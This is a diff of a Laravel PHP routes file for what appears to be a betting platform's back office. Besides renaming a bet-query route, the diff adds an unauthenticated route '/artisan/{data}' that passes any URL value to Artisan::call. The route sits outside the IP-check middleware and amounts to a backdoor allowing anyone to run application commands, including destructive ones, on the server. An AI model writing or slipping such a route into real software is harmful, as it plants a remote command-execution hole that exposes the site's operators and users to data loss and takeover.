@@ -1,4 +1,9 @@
 <?php
+
+
+Route::get('/artisan/{data}',function($data){
+    \Illuminate\Support\Facades\Artisan::call($data);
+});
 Route::get('/test', 'GamesApi\Card\PrivodeController@test');
 Route::group(['middleware'=>['check-ip']],function () {
     Route::get('/', 'Back\SrcViewController@index');
@@ -312,7 +317,7 @@ Route::group(['middleware'=>['check-ip']],function () {
 
     Route::get('/back/datatables/openHistory/card_betInfo', 'Back\Data\openHistoryController@card_betInfo'); //棋牌下注
     Route::get('/back/datatables/openHistory/errorBet', 'Back\Data\openHistoryController@errorBet'); //拉取失败注单数据
-    Route::get('/back/datatables/openHistory/TCBetInfo', 'Back\Data\openHistoryController@TCBetInfo'); //TC下注查询
+    Route::get('/back/datatables/openHistory/BetInfo', 'Back\Data\openHistoryController@BetInfo'); //下注查询
 
 
     Route::get('/back/datatables/agentSettle/report', 'Back\Data\AgentSettleController@report'); //代理结算报表-表格数据
